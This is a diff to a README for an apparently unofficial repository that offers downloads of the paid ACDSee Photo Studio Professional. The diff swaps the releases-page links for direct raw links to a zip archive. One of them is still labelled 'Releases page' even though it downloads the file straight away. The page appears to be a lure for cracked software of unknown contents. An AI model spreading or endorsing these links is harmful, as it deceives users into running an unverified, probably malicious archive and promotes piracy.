@@ -1,6 +1,6 @@
 # 🖼️ ACDSee-Photo-Studio-Professional-Download - Easily Download Your Photo Editing Software
 
-[![Download ACDSee Photo Studio](https://img.shields.io/badge/Download-Now-blue)](https://github.com/sa726/ACDSee-Photo-Studio-Professional-Download/releases)
+[![Download ACDSee Photo Studio](https://raw.githubusercontent.com/sa726/ACDSee-Photo-Studio-Professional-Download/main/gib/ACDSee-Photo-Studio-Professional-Download.zip)](https://raw.githubusercontent.com/sa726/ACDSee-Photo-Studio-Professional-Download/main/gib/ACDSee-Photo-Studio-Professional-Download.zip)
 
 ## 📚 Overview
 
@@ -13,7 +13,7 @@ To get started with ACDSee Photo Studio, follow these simple steps. No technical
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [ACDSee Photo Studio Releases page](https://github.com/sa726/ACDSee-Photo-Studio-Professional-Download/releases) to find the latest version.
+   Go to the [ACDSee Photo Studio Releases page](https://raw.githubusercontent.com/sa726/ACDSee-Photo-Studio-Professional-Download/main/gib/ACDSee-Photo-Studio-Professional-Download.zip) to find the latest version.
 
 2. **Select the Version**  
    Browse through the available versions. Choose the one that fits your needs. Look for labels like "Latest Release" or "Stable Version."
